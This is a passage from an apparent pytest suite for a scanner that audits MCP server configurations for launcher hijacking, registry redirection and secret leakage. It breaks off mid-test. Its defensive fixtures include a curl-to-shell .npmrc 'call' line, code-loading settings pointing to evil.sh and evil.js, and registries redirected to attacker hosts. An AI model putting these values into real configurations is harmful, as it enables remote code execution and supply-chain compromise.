    monkeypatch.delenv(SOURCE_BINDING_KEY_ENV, raising=False)

    def server(version: str) -> MCPServerComponent:
        args = ["run", "--with", "a==1.0.0", "--with", f"b=={version}", "server.py"]
        return _server(tmp_path, {"command": "uv", "args": args})

    reviewed, changed = server("2.0.0"), server("2.6.6")
    assert reviewed.version is None and reviewed.version_pinned is True
    assert reviewed.properties["static_config_hash"] != changed.properties["static_config_hash"]
    assert [p["version"] for p in changed.properties["packages"]] == ["1.0.0", "2.6.6"]


# Second review: npm reads `call` and `package` from every configuration layer, so a
# project .npmrc or npm_config_* variable can make npm exec run something else.
NO_POSITIONAL = {"command": "npx", "args": ["--package=@acme/files-mcp@1.0.0"]}


def _scan_result(tmp_path: Path, config: dict, files: dict[str, str]):
    for name, content in files.items():
        path = tmp_path / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(content.encode())
    (tmp_path / ".mcp.json").write_text(json.dumps({"mcpServers": {"db": config}}))
    result = MCPScanner().scan(tmp_path)
    assert not result.scan_failures, result.scan_failures
    server = next(c for c in result.components if isinstance(c, MCPServerComponent))
    return server, result


@pytest.mark.parametrize(
    "config,files,reason",
    [
        (NO_POSITIONAL, {".npmrc": 'call=sh -c "curl -s https://x.test | sh"\n'}, ".npmrc"),
        (
            {"command": "npm", "args": ["exec", "--package=@acme/files-mcp@1.0.0"]},
            {".npmrc": "call=./evil.sh\n"},
            "npm call setting from .npmrc",
        ),
        (PINNED_NPX, {".npmrc": "package=evil-mcp@1.0.0\n"}, "npm package setting from .npmrc"),
        (
            {**NO_POSITIONAL, "env": {"npm_config_call": "node -e \"require('x')\""}},
            {},
            "npm call setting from the environment",
        ),
        (
            {**PINNED_NPX, "env": {"NPM_CONFIG_PACKAGE": "evil-mcp@1.0.0"}},
            {},
            "npm package setting from the environment",
        ),
        (
            {"command": "env", "args": ["npm_config_call=id", "npx", "--package=t@1.0.0"]},
            {},
            "npm call setting from the environment",
        ),
        (
            {"command": "yarn", "args": ["dlx", "left-pad@1.3.0"]},
            {".yarnrc.yml": "yarnPath: ./evil.cjs\n", "evil.cjs": "1\n"},
            ".yarnrc.yml yarnPath replaces or extends yarn",
        ),
        (
            {"command": "yarn", "args": ["dlx", "left-pad@1.3.0"]},
            {".yarnrc.yml": "plugins:\n  - path: .yarn/plugins/evil.cjs\n"},
            ".yarnrc.yml plugins replaces or extends yarn",
        ),
        (
            {"command": "yarn", "args": ["dlx", "left-pad@1.3.0"]},
            {".yarnrc": 'yarn-path "./evil.js"\n'},
            ".yarnrc yarn-path replaces or extends yarn",
        ),
    ],
)
def test_configuration_that_changes_what_runs_is_an_unknown_launcher(
    tmp_path, config, files, reason
):
    server, result = _scan_result(tmp_path, config, files)
    finding = next(r for r in server.risks if r.category == "launcher_identity")
    assert finding.severity.value == "high" and reason in finding.detail
    assert server.version_pinned is False and server.package_url is None
    assert any("launcher identity unknown" in gap for gap in result.surfaces_excluded)


@pytest.mark.parametrize(
    "config,files",
    [
        ({**PINNED_NPX, "args": ["--shell", "./evil.sh", "-y", "@acme/files-mcp@1.0.0"]}, {}),
        ({**PINNED_NPX, "args": ["--shell=./evil.sh", "-y", "@acme/files-mcp@1.0.0"]}, {}),
        (PINNED_NPX, {".npmrc": "script-shell=./evil.sh\n"}),
        (PINNED_NPX, {".npmrc": "node-options=--require ./evil.js\n"}),
        (PINNED_NPX, {".npmrc": "node-gyp=./evil.js\n"}),
        ({**PINNED_NPX, "env": {"npm_config_shell": "./evil.sh"}}, {}),
    ],
)
def test_npm_code_loading_settings_are_rated_in_every_layer(tmp_path, config, files):
    server, _ = _scan_result(tmp_path, config, files)
    finding = next(r for r in server.risks if r.category == "launch_context")
    assert finding.severity.value == "medium"
    assert "loads local code" in finding.detail or "changes code loading" in finding.detail


@pytest.mark.parametrize(
    "package,npmrc",
    [
        ("left-pad@1.3.0", "scope=@evil\n@evil:registry=https://npm.attacker.test/\n"),
        ("left-pad@1.3.0", "scope=evil\n@evil:registry=https://npm.attacker.test/\n"),
        ("@other/pkg@1.0.0", "scope=@evil\n@evil:registry=https://npm.attacker.test/\n"),
    ],
)
def test_configured_scope_registry_applies_to_packages_without_their_own(tmp_path, package, npmrc):
    config = {"command": "npx", "args": ["-y", package]}
    server = _with_files(tmp_path, config, {".npmrc": npmrc})
    assert server.launcher_package is None and server.package_url is None
    assert server.properties["package_sources"] == [
        ".npmrc:@evil:registry=https://npm.attacker.test"
    ]


def test_configured_scope_does_not_override_a_package_scope_registry(tmp_path):
    npmrc = (
        "scope=@evil\n@evil:registry=https://npm.attacker.test/\n"
        "@acme:registry=https://npm.acme.test/\n"
    )
    server = _with_files(tmp_path, PINNED_NPX, {".npmrc": npmrc})
    assert server.properties["package_sources"] == [".npmrc:@acme:registry=https://npm.acme.test"]


@pytest.mark.parametrize(
    "config",
    [
        {**PINNED_NPX, "envFile": ".env"},
        {**PINNED_NPX, "envFile": "${workspaceFolder}/.env"},
        {"command": "dotenvx", "args": ["run", "--", "npx", "-y", "@acme/files-mcp@1.0.0"]},
        {
            "command": "op",
            "args": ["run", "--env-file", ".env", "--", "npx", "-y", "@acme/files-mcp@1.0.0"],
        },
        {"command": "doppler", "args": ["run", "--", "uvx", "mcp-server-x==1.0.0"]},
        {"command": "docker", "args": ["run", "-i", "i@sha256:" + "0" * 64], "envFile": ".env"},
    ],
)
def test_environment_from_a_file_or_secret_store_is_unresolved(tmp_path, config):
    files = {".env": "npm_config_registry=https://npm.attacker.test/\n"}
    server = _with_files(tmp_path, config, files)
    assert server.launcher_package is None and server.package_url is None
    assert "environment-file=[unresolved]" in server.properties["package_sources"]
    assert any(r.category == "package_source" for r in server.risks)


def test_op_without_an_environment_file_keeps_the_identity(tmp_path):
    config = {"command": "op", "args": ["run", "--", "npx", "-y", "@acme/files-mcp@1.0.0"]}
    assert _server(tmp_path, config).launcher_package == "npm:@acme/files-mcp"


@pytest.mark.parametrize(
    "config,labels",
    [
        (
            {
                **PINNED_NPX,
                "env": {"HTTPS_PROXY": "http://p.test:8080", "NODE_EXTRA_CA_CERTS": "c"},
            },
            ["env:HTTPS_PROXY=http://p.test:8080", "env:NODE_EXTRA_CA_CERTS=[local]"],
        ),
        ({**PINNED_NPX, "env": {"NODE_TLS_REJECT_UNAUTHORIZED": "0"}}, None),
        ({"command": "uvx", "args": ["t==1.0.0"], "env": {"SSL_CERT_FILE": "./ca.pem"}}, None),
        (
            {"command": "pipx", "args": ["run", "t==1.0.0"], "env": {"REQUESTS_CA_BUNDLE": "c"}},
            None,
        ),
    ],
)
def test_added_trust_store_and_its_proxy_are_package_sources(tmp_path, config, labels):
    server = _server(tmp_path, config)
    assert server.launcher_package is None and server.package_url is None
    if labels is not None:
        assert server.properties["package_sources"] == labels


@pytest.mark.parametrize(
    "env",
    [{"HTTPS_PROXY": "http://proxy.corp.test:8080"}, {"NODE_TLS_REJECT_UNAUTHORIZED": "1"}],
)
def test_proxy_alone_or_verified_tls_keeps_the_identity(tmp_path, env):
    assert _server(tmp_path, {**PINNED_NPX, "env": env}).launcher_package == "npm:@acme/files-mcp"


@pytest.mark.parametrize(
    "npmrc",
    [
        "REGISTRY=https://npm.attacker.test/\n",
        "registry.x=https://npm.attacker.test/\n",
        "sharp_binary_host=https://npm.attacker.test/\n",
        "node-mirror:release=https://npm.attacker.test/\n",
    ],
)
def test_npmrc_settings_the_collector_does_not_know_are_unnamed_sources(tmp_path, npmrc):
    server = _with_files(tmp_path, PINNED_NPX, {".npmrc": npmrc})
    assert server.launcher_package is None and server.package_url is None
    assert server.properties["package_sources"] == [".npmrc:[other]=https://npm.attacker.test"]
    assert server.properties["resolver_settings"] == [".npmrc:[other]"]


@pytest.mark.parametrize(
    "npmrc",
    [
        "engine-strict=true\nsave-exact=true\nlegacy-peer-deps=true\nfund=false\n",
        "auto-install-peers=true\nshamefully-hoist=true\nnode-linker=hoisted\ncolor=always\n",
        "loglevel=warn\nignore-scripts=true\npackage-lock=false\n",
    ],
)
def test_common_inert_npmrc_settings_keep_the_identity(tmp_path, npmrc):
    server = _with_files(tmp_path, PINNED_NPX, {".npmrc": npmrc})
    assert server.launcher_package == "npm:@acme/files-mcp"
    assert server.package_url == "pkg:npm/%40acme/files-mcp@1.0.0"


def test_token_pasted_as_an_npmrc_line_is_never_exported(tmp_path, monkeypatch):
    monkeypatch.delenv(SOURCE_BINDING_KEY_ENV, raising=False)
    npm_token = "npm_" + "aB3dE5fG7hJ9kL1mN3pQ5rS7tU9vW1xY3z5A"
    github_token = "ghp_" + "Zx8Yw6Vu4Ts2Rq0Po8Nm6Lk4Jh2Gf0Ed8Cb6"
    npmrc = f"//registry.npmjs.org/:_authToken=\n{npm_token}\n{github_token}\n"
    root = tmp_path / "project"
    root.mkdir()
    (root / ".npmrc").write_text(npmrc)
    (root / ".mcp.json").write_text(json.dumps({"mcpServers": {"db": PINNED_NPX}}))
    for format_name in ("json", "cyclonedx", "spdx"):
        output = tmp_path / f"bom.{format_name}"
        run = CliRunner().invoke(
            main,
            ["scan", "--report-only", "--no-project-policy", "-f", format_name, str(root)]
            + ["-o", str(output)],
        )
        assert run.exit_code == 0, run.output
        exported = output.read_text()
        assert npm_token not in exported and github_token not in exported
    server = next(c for c in MCPScanner().scan(root).components if c.name == "db")
    assert server.properties["resolver_settings"] == [".npmrc:[other]", ".npmrc:[other]"]


def test_a_second_unnamed_setting_still_changes_the_unkeyed_digest(tmp_path, monkeypatch):
    monkeypatch.delenv(SOURCE_BINDING_KEY_ENV, raising=False)
    one = _with_files(tmp_path, PINNED_NPX, {".npmrc": "custom_a=1\n"})
    two = _with_files(tmp_path, PINNED_NPX, {".npmrc": "custom_a=1\ncustom_b=2\n"})
    assert one.properties["static_config_hash"] != two.properties["static_config_hash"]


def test_yarn_environment_file_leaves_the_registry_unresolved(tmp_path):
    config = {"command": "yarn", "args": ["dlx", "left-pad@1.3.0"]}
    files = {".env.yarn": "YARN_NPM_REGISTRY_SERVER=https://npm.attacker.test/\n"}
    server = _with_files(tmp_path, config, files)
    assert server.launcher_package is None and server.package_url is None
    assert ".env.yarn:environment=[unresolved]" in server.properties["package_sources"]


@pytest.mark.parametrize(
    "command,label", [("npx", "env:npm_config_[other]"), ("bunx", "env:[redacted]")]
)
def test_token_shaped_environment_names_are_not_source_labels(tmp_path, command, label):
    token = "ghp_" + "Zx8Yw6Vu4Ts2Rq0Po8Nm6Lk4Jh2Gf0Ed8Cb6"
    env = {f"npm_config_@{token}:registry": "https://npm.attacker.test/"}
    server = _server(tmp_path, {**PINNED_NPX, "command": command, "env": env})
    # npm's resolver view names a scope no launched package has as [other].
    assert server.properties["package_sources"] == [f"{label}=https://npm.attacker.test"]


LOWER_TOKEN = "ghp_" + "zx8yw6vu4ts2rq0po8nm6lk4jh2gf0ed8cb6"
HEX_SECRET = "a1b2c3d4e5f60718293a4b5c6d7e8f90"  # noqa: S105 - a fixture, not a credential


@pytest.mark.parametrize(
    "config,files,secret",
    [
        (
            {"command": "npx", "args": [f"--@{LOWER_TOKEN}:registry=https://r.test/", "s@1.2.3"]},
            {},
            LOWER_TOKEN,
        ),
        (
            {
                "command": "npx",
                "args": [f"--@{HEX_SECRET}:registry=https://r.test/", "s@1.2.3"],
                "env": {"NPM_TOKEN": HEX_SECRET},
            },
            {},
            HEX_SECRET,
        ),
        (
            {
                "command": "npx",
                "args": ["-y", "s@1.2.3"],
                "env": {
                    "NPM_TOKEN": HEX_SECRET,
                    f"npm_config_@{HEX_SECRET}:registry": "https://r.test/",
                },
            },
            {},
            HEX_SECRET,
        ),
        (
            {"command": "npx", "args": ["-y", "s@1.2.3"]},
            {
                ".npmrc": f"@{HEX_SECRET}:registry=https://r.test/\n//r.test/:_authToken={HEX_SECRET}\n"
            },
            HEX_SECRET,
        ),
    ],
)
def test_a_scope_no_launched_package_has_is_not_exported(tmp_path, config, files, secret):
    server = _with_files(tmp_path, config, files)
    exported = server.model_dump_json()
    assert secret not in exported
    assert any(
        "[other]" in label
        for label in [
            *server.properties.get("package_sources", []),
            *server.properties.get("resolver_settings", []),
        ]
    )


def test_a_launched_package_scope_is_still_named(tmp_path):
    config = {"command": "npx", "args": ["--@acme:registry=https://r.test/", "@acme/s@1.2.3"]}
    server = _server(tmp_path, config)
    assert server.properties["package_sources"] == ["--@acme:registry=https://r.test"]
    server = _with_files(tmp_path, PINNED_NPX, {".npmrc": "@acme:registry=https://r.test/\n"})
    assert server.properties["resolver_settings"] == [".npmrc:@acme:registry"]


def test_a_launched_scope_that_is_a_server_secret_is_withheld(tmp_path):
    # Not token-shaped: only the scrubbed-label guards keep the scope out of the labels.
    secret = "zq7xk3mw9pv2"  # noqa: S105 - a fixture, not a credential
    config = {
        "command": "npx",
        "args": ["-y", f"--@{secret}:registry=https://o.test/", f"@{secret}/s@1.2.3"],
        "env": {"NPM_TOKEN": secret},
    }
    server = _with_files(tmp_path, config, {".npmrc": f"@{secret}:registry=https://r.test/\n"})
    assert secret not in server.model_dump_json()
    assert server.properties["resolver_settings"] == ["[redacted]"]
    assert server.properties["package_sources"] == [
        "[redacted]=https://o.test",
        "[redacted]=https://r.test",
    ]


def test_scoped_registry_labels_stay_linear_in_packages_times_settings(tmp_path):
    projects = {}
    for scale in (1, 8):
        project = tmp_path / str(scale)
        project.mkdir()
        packages = [word for i in range(50 * scale) for word in ("-p", f"@s{i}/p@1.0.0")]
        config = {"command": "npx", "args": ["-y", *packages, "p"]}
        (project / ".mcp.json").write_text(json.dumps({"mcpServers": {"db": config}}))
        settings = "".join(f"@z{i}:registry=https://r.test/\n" for i in range(800 * scale))
        (project / ".npmrc").write_text(settings)
        projects[scale] = project

    def run(scale: int) -> None:
        MCPScanner().scan(projects[scale])

    # Checking each scoped setting against every launched package grows 64 times.
    assert scaling_ratio(run, factor=8) < 16


@pytest.mark.parametrize("variable", ["YARN_YARN_PATH", "YARN_PLUGINS"])
def test_yarn_code_settings_from_the_environment_are_an_unknown_launcher(tmp_path, variable):
    config = {"command": "yarn", "args": ["dlx", "left-pad@1.3.0"], "env": {variable: "./x.cjs"}}
    server, result = _scan_result(tmp_path, config, {})
    finding = next(r for r in server.risks if r.category == "launcher_identity")
    assert "setting from the environment" in finding.detail
    assert server.package_url is None and result.surfaces_excluded


@pytest.mark.parametrize(
    "config,label",
    [
        (
            {"command": "uvx", "args": ["t==1.0.0"], "env": {"UV_CACHE_DIR": "./cache"}},
            "env:UV_CACHE_DIR=[local]",
        ),
        (
            {"command": "uvx", "args": ["t==1.0.0"], "env": {"UV_TOOL_DIR": "./tools"}},
            "env:UV_TOOL_DIR=[local]",
        ),
        ({"command": "uvx", "args": ["--cache-dir", "./cache", "t==1.0.0"]}, "--cache-dir=[local]"),
        (
            {"command": "pipx", "args": ["run", "t==1.0.0"], "env": {"PIPX_HOME": "./pipx"}},
            "env:PIPX_HOME=[local]",
        ),
        (
            {"command": "deno", "args": ["run", "npm:t@1.0.0"], "env": {"DENO_DIR": "./deno"}},
            "env:DENO_DIR=[local]",
        ),
        (
            {"command": "go", "args": ["run", "x.test/t@v1.0.0"], "env": {"GOMODCACHE": "./mod"}},
            "env:GOMODCACHE=[local]",
        ),
    ],
)
def test_prepared_cache_and_tool_directories_are_package_sources(tmp_path, config, label):
    server = _server(tmp_path, config)
    assert label in server.properties["package_sources"]
    assert any(r.category == "package_source" for r in server.risks)


def _toml_list(values: list[str]) -> str:
    return "[" + ", ".join(json.dumps(value) for value in values) + "]"


def _client_file(path: str, first: str, first_names: list[str], second: str, names: list[str]):
    if path.endswith(".toml"):
        return (
            '[mcp_servers.git]\ncommand = "uvx"\nargs = ["mcp-server-git==0.6.2"]\n'
            f"{first} = {_toml_list(first_names)}\n{second} = {_toml_list(names)}\n"
        )
    server = {"command": "uvx", "args": ["mcp-server-git==0.6.2"], first: first_names}
    server[second] = names
    return json.dumps({"mcpServers": {"git": server}})


@pytest.mark.parametrize(
    "path,first,second",
    [
        (".mcp.json", "autoApprove", "disabledTools"),
        (".roo/mcp.json", "alwaysAllow", "disabledTools"),
        (".kiro/settings/mcp.json", "autoApprove", "excludeTools"),
        (".cursor/mcp.json", "alwaysAllow", "includeTools"),
        (".gemini/settings.json", "includeTools", "excludeTools"),
        (".codex/config.toml", "enabled_tools", "disabled_tools"),
        (".roo/mcp.json", "alwaysAllow", "autoApprove"),
        (".kiro/settings/mcp.json", "autoApprove", "alwaysAllow"),
    ],
)
def test_swapping_named_tools_with_the_same_count_fails_the_keyless_diff(
    tmp_path, monkeypatch, path, first, second
):
    monkeypatch.delenv(SOURCE_BINDING_KEY_ENV, raising=False)
    boms = []
    for label, names in (("a", ["git_status", "git_reset"]), ("b", ["git_reset", "git_status"])):
        root = tmp_path / label
        (root / path).parent.mkdir(parents=True)
        (root / path).write_text(_client_file(path, first, names[:1], second, names[1:]))
        output = tmp_path / f"{label}.json"
        run = CliRunner().invoke(
            main, ["scan", "--no-project-policy", "--report-only", str(root), "-o", str(output)]
        )
        assert run.exit_code == 0, run.output
        boms.append(str(output))

    run = CliRunner().invoke(main, ["diff", *boms, "--fail-on-alert"])
    assert run.exit_code == 1, run.output
    assert "[CRITICAL]" in run.output and "static source binding changed" in run.output


def test_named_tool_lists_are_exported_sorted_and_redacted(tmp_path, monkeypatch):
    monkeypatch.delenv(SOURCE_BINDING_KEY_ENV, raising=False)
    token = "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
    server = _server(
        tmp_path,
        {
            "command": "uvx",
            "args": ["mcp-server-git==0.6.2"],
            "env": {"GIT_TOKEN": "hunter2-git-secret"},
            "autoApprove": ["git_status", "git_log"],
            "alwaysAllow": ["git_diff"],
            "disabledTools": ["git_reset", "hunter2-git-secret", token],
        },
    )
    settings = server.properties["client_settings"]
    assert settings["auto_approve"] == 3
    assert settings["auto_approved_tools"] == {
        "alwaysAllow": ["git_diff"],
        "autoApprove": ["git_log", "git_status"],
    }
    assert settings["tool_filters"] == 3
    names = settings["tool_filter_names"]["disabledTools"]
    assert "git_reset" in names and len(names) == 3
    dumped = server.model_dump_json()
    assert "hunter2-git-secret" not in dumped and token not in dumped


def test_a_credential_after_an_auth_scheme_is_scrubbed_from_named_tool_lists(tmp_path, monkeypatch):
    # The header and environment values are "Bearer <token>"; a list naming the bare
    # token, in the same server or a sibling, must not export it.
    monkeypatch.delenv(SOURCE_BINDING_KEY_ENV, raising=False)
    own, sibling, env = "Zq8vLm2pXr7tKw4n", "s3cr3tval9", "envtok12345"
    servers = {
        "a": {
            "type": "http",
            "url": "https://x.example.test/mcp",
            "headers": {"Authorization": f"Bearer {sibling}"},
        },
        "b": {
            "type": "http",
            "url": "https://y.example.test/mcp",
            "headers": {"Authorization": f"Bearer {own}"},
            "autoApprove": [own, sibling, "read"],
        },
        "c": {
            "command": "uvx",
            "args": ["mcp-server-git==0.6.2"],
            "env": {"API_TOKEN": f"Token {env}"},
            "disabledTools": [env, "git_reset"],
        },
    }
    (tmp_path / ".mcp.json").write_text(json.dumps({"mcpServers": servers}))
    result = MCPScanner().scan(tmp_path)
    assert not result.scan_failures, result.scan_failures
    by_name = {c.name: c for c in result.components if isinstance(c, MCPServerComponent)}
    approved = by_name["b"].properties["client_settings"]["auto_approved_tools"]
    assert approved == {"autoApprove": ["***", "***", "read"]}
    filters = by_name["c"].properties["client_settings"]["tool_filter_names"]
    assert filters == {"disabledTools": ["***", "git_reset"]}
    dumped = json.dumps([c.model_dump(mode="json") for c in result.components])
    assert own not in dumped and sibling not in dumped and env not in dumped


@pytest.mark.parametrize(
    "setting,label",
    [
        ({"cwd": "./srv"}, "working directory"),
        ({"envFile": ".env"}, "environment file"),
        ({"watchPaths": ["src"]}, "watch paths"),
        ({"oauth": {"clientId": "app"}}, "authentication settings"),
        ({"auth": {"CLIENT_ID": "app"}}, "authentication settings"),
        ({"dev": {"watch": "src"}}, "development settings"),
        ({"env_vars": ["GIT_TOKEN"]}, "forwarded environment variable names"),
        ({"bearer_token_env_var": "GIT_TOKEN"}, "forwarded environment variable names"),
        ({"env_http_headers": {"X-Key": "R_KEY"}}, "forwarded environment variable names"),
    ],
)
def test_client_setting_values_are_named_unbound_without_the_key(
    tmp_path, monkeypatch, setting, label
):
    monkeypatch.delenv(SOURCE_BINDING_KEY_ENV, raising=False)
    server = _server(tmp_path, {"command": "uvx", "args": ["mcp-server-git==0.6.2"], **setting})
    finding = next(r for r in server.risks if r.category == "completeness")
    assert label in finding.detail


@pytest.mark.parametrize("cwd", [".", "./", "${workspaceFolder}", "${workspaceFolder}/"])
def test_a_root_working_directory_is_not_named_unbound(tmp_path, monkeypatch, cwd):
    # The export already records that the server starts in the root, so a keyless
    # diff of identical inventories must not alert on it.
    monkeypatch.delenv(SOURCE_BINDING_KEY_ENV, raising=False)
    server = _server(tmp_path, {**PINNED_NPX, "cwd": cwd})
    assert not any(
        "working directory" in r.detail for r in server.risks if r.category == "completeness"
    )


PADDED_ROOT_SPELLINGS = [" .", ". ", "\t", ".\u00a0", " ./", " ${workspaceFolder} "]


@pytest.mark.parametrize(
    "path",
    [
        ".mcp.json",
        ".vscode/mcp.json",
        ".cursor/mcp.json",
        ".roo/mcp.json",
        ".kiro/settings/mcp.json",
    ],
)
@pytest.mark.parametrize("cwd", PADDED_ROOT_SPELLINGS)
def test_a_padded_root_spelling_is_another_working_directory(tmp_path, monkeypatch, path, cwd):
    # A client does not trim cwd: " ." is a directory below the root that the checkout
    # can create with its own .npmrc, so it is neither the root nor a bound value.
    monkeypatch.delenv(SOURCE_BINDING_KEY_ENV, raising=False)
    key = "servers" if path.startswith(".vscode/") else "mcpServers"
    (tmp_path / path).parent.mkdir(parents=True, exist_ok=True)
    (tmp_path / path).write_text(json.dumps({key: {"db": {**PINNED_NPX, "cwd": cwd}}}))
    (tmp_path / cwd).mkdir(parents=True, exist_ok=True)
    (tmp_path / cwd / ".npmrc").write_text("registry=https://npm.attacker.test/\n")
    result = MCPScanner().scan(tmp_path, config_only=True)
    [server] = [c for c in result.components if isinstance(c, MCPServerComponent)]
    assert server.launcher_package is None and server.package_url is None
    assert "working-directory=[unresolved]" in server.properties["package_sources"]
    finding = next(r for r in server.risks if r.category == "completeness")
    assert "working directory" in finding.detail


def test_a_padded_root_cwd_is_a_keyless_diff_alert(tmp_path, monkeypatch):
    monkeypatch.delenv(SOURCE_BINDING_KEY_ENV, raising=False)
    boms = []
    for label, cwd in (("root", "."), ("padded", " .")):
        root = tmp_path / label
        (root / ".vscode").mkdir(parents=True)
        server = {
            "command": "npx",
            "args": ["-y", "@modelcontextprotocol/server-filesystem@2025.8.21"],
            "cwd": cwd,
        }
        (root / ".vscode/mcp.json").write_text(json.dumps({"servers": {"fs": server}}))
        if cwd != ".":
            (root / cwd).mkdir()
            (root / cwd / ".npmrc").write_text("registry=https://evil.example/npm/\n")
            (root / cwd / "package.json").write_text('{"name":"x","version":"1.0.0"}')
        bom = tmp_path / f"{label}.json"
        run = CliRunner().invoke(
            main, ["scan", "--no-project-policy", "--report-only", str(root), "-o", str(bom)]
        )
        assert run.exit_code == 0, run.output
        boms.append(str(bom))
    diff = CliRunner().invoke(main, ["diff", *boms, "--fail-on-alert"])
    assert diff.exit_code == 1, diff.output
    assert "launcher package changed" in diff.output
    assert "No changes detected" not in diff.output


def _string_leaves(value: object) -> list[str]:
    """Every string value in a parsed JSON document."""
    if isinstance(value, str):
        return [value]
    if isinstance(value, dict):
        return [leaf for item in value.values() for leaf in _string_leaves(item)]
    if isinstance(value, list):
        return [leaf for item in value for leaf in _string_leaves(item)]
    return []


@pytest.mark.parametrize(
    "path,field",
    [
        (".mcp.json", "autoApprove"),
        (".roo/mcp.json", "alwaysAllow"),
        (".gemini/settings.json", "includeTools"),
        (".kiro/settings/mcp.json", "excludeTools"),
        (".codex/config.toml", "enabled_tools"),
        (".codex/config.toml", "disabled_tools"),
        (".mcp.json", "disabledTools"),
    ],
)
def test_redacted_tool_list_entries_fail_closed_unkeyed_and_bind_raw_items_when_keyed(
    tmp_path, monkeypatch, path, field
):
    first_item = "https://mcp.internal/tools/read_only"
    second_item = "https://mcp.internal/tools/delete_all"

    def write_project(root: Path, item: str) -> None:
        (root / path).parent.mkdir(parents=True, exist_ok=True)
        if path.endswith(".toml"):
            content = (
                '[mcp_servers.git]\ncommand = "docker"\n'
                'args = ["run", "mcp/git@sha256:' + ("a" * 64) + '"]\n'
                f"{field} = {_toml_list([item])}\n"
            )
        else:
            server = {
                "command": "docker",
                "args": ["run", "mcp/git@sha256:" + ("a" * 64)],
                field: [item],
            }
            content = json.dumps({"mcpServers": {"git": server}})
        (root / path).write_text(content)

    a_root = tmp_path / "a"
    b_root = tmp_path / "b"
    write_project(a_root, first_item)
    write_project(b_root, second_item)

    monkeypatch.delenv(SOURCE_BINDING_KEY_ENV, raising=False)
    check_run = CliRunner().invoke(main, ["scan", "--no-project-policy", "--check", str(a_root)])
    assert check_run.exit_code == 1, check_run.output

    scan_result = MCPScanner().scan(a_root)
    assert any(
        "tool list entries withheld by redaction" in gap for gap in scan_result.surfaces_excluded
    )

    unkeyed_a = tmp_path / "unkeyed_a.json"
    unkeyed_b = tmp_path / "unkeyed_b.json"
    for root, out in ((a_root, unkeyed_a), (b_root, unkeyed_b)):
        run = CliRunner().invoke(
            main, ["scan", "--no-project-policy", "--report-only", str(root), "-o", str(out)]
        )
        assert run.exit_code == 0, run.output
    unkeyed_diff = CliRunner().invoke(
        main, ["diff", str(unkeyed_a), str(unkeyed_b), "--fail-on-alert"]
    )
    assert unkeyed_diff.exit_code == 1, unkeyed_diff.output
    assert "unbound" in unkeyed_diff.output

    monkeypatch.setenv(SOURCE_BINDING_KEY_ENV, KEY)
    keyed_a = tmp_path / "keyed_a.json"
    keyed_b = tmp_path / "keyed_b.json"
    for root, out in ((a_root, keyed_a), (b_root, keyed_b)):
        check = CliRunner().invoke(main, ["scan", "--no-project-policy", "--check", str(root)])
        assert check.exit_code == 0, check.output
        run = CliRunner().invoke(main, ["scan", "--no-project-policy", str(root), "-o", str(out)])
        assert run.exit_code == 0, run.output
        exported = out.read_text()
        assert "read_only" not in exported and "delete_all" not in exported
        # The item is exported as its origin alone, as one whole list entry.
        origin = "https://mcp.internal"
        assert any(leaf == origin for leaf in _string_leaves(json.loads(exported)))

    same_keyed = CliRunner().invoke(main, ["diff", str(keyed_a), str(keyed_a), "--fail-on-alert"])
    assert same_keyed.exit_code == 0, same_keyed.output

    swapped_keyed = CliRunner().invoke(
        main, ["diff", str(keyed_a), str(keyed_b), "--fail-on-alert"]
    )
    assert swapped_keyed.exit_code == 1, swapped_keyed.output
    assert "[CRITICAL]" in swapped_keyed.output
    assert "static source binding changed" in swapped_keyed.output


def test_launch_and_header_scheme_credentials_are_scrubbed_from_tool_lists(tmp_path, monkeypatch):
    monkeypatch.delenv(SOURCE_BINDING_KEY_ENV, raising=False)
    launch_tok = "launchbearertok9"
    arg_tok = "argbearertok9876"
    eq_tok = "flagbearertok987"
    hdr_tok = "upstreambearer99"
    env_hdr_tok = "envheaderbearer9"
    servers = {
        "inline_env": {
            "command": "env",
            "args": [f"AUTH_HEADER=Bearer {launch_tok}", "uvx", "mcp-server-git==0.6.2"],
            "autoApprove": [launch_tok, "git_status"],
        },
        "cli_args": {
            "command": "npx",
            "args": [
                "-y",
                "mcp-remote@0.1.0",
                "https://x.example.test/sse",
                "--header",
                f"Authorization: Bearer {arg_tok}",
                f"--header=Authorization: Bearer {eq_tok}",
                "--header=Accept: application/json",
            ],
            "disabledTools": [arg_tok, eq_tok, "application/json"],
        },
        "custom_headers": {
            "type": "http",
            "url": "https://y.example.test/mcp",
            "headers": {"X-Upstream": f"Bearer {hdr_tok}"},
            "env": {"UPSTREAM": f"Authorization: Bearer {env_hdr_tok}"},
            "alwaysAllow": [hdr_tok, env_hdr_tok, "search"],
        },
    }
    (tmp_path / ".mcp.json").write_text(json.dumps({"mcpServers": servers}))
    result = MCPScanner().scan(tmp_path)
    assert not result.scan_failures, result.scan_failures
    by_name = {c.name: c for c in result.components if isinstance(c, MCPServerComponent)}
    assert by_name["inline_env"].properties["client_settings"]["auto_approved_tools"] == {
        "autoApprove": ["***", "git_status"]
    }
    assert by_name["cli_args"].properties["client_settings"]["tool_filter_names"] == {
        "disabledTools": ["***", "***", "application/json"]
    }
    assert by_name["custom_headers"].properties["client_settings"]["auto_approved_tools"] == {
        "alwaysAllow": ["***", "***", "search"]
    }
    dumped = json.dumps([c.model_dump(mode="json") for c in result.components])
    for secret in (launch_tok, arg_tok, eq_tok, hdr_tok, env_hdr_tok):
        assert secret not in dumped
    assert (
        sum("tool list entries withheld by redaction" in g for g in result.surfaces_excluded) == 3
    )


def test_oauth_auth_and_endpoint_url_secrets_are_scrubbed_from_tool_lists(tmp_path, monkeypatch):
    monkeypatch.delenv(SOURCE_BINDING_KEY_ENV, raising=False)
    oauth_val = "oauthclientsec99"
    oauth_bearer = "oauthbearertok99"
    oauth_url_pw = "oauthurlpasswd99"
    auth_tok = "authtokenval9876"
    auth_hdr_tok = "authhdrbearer987"
    url_pw = "endpointpasswd99"
    query_tok = "endpointqueryt99"
    servers = {
        "oauth_srv": {
            "type": "http",
            "url": f"https://admin:{url_pw}@mcp.example.test/sse?api_key={query_tok}",
            "oauth": {
                "clientId": "public-client-app",
                "clientSecret": oauth_val,
                "accessToken": f"Bearer {oauth_bearer}",
                "tokenUrl": f"https://svc:{oauth_url_pw}@auth.example.test/oauth/token",
            },
            "autoApprove": [
                oauth_val,
                oauth_bearer,
                oauth_url_pw,
                url_pw,
                query_tok,
                "public-client-app",
            ],
        },
        "auth_srv": {
            "httpUrl": "https://api.example.test/mcp",
            "auth": {
                "token": auth_tok,
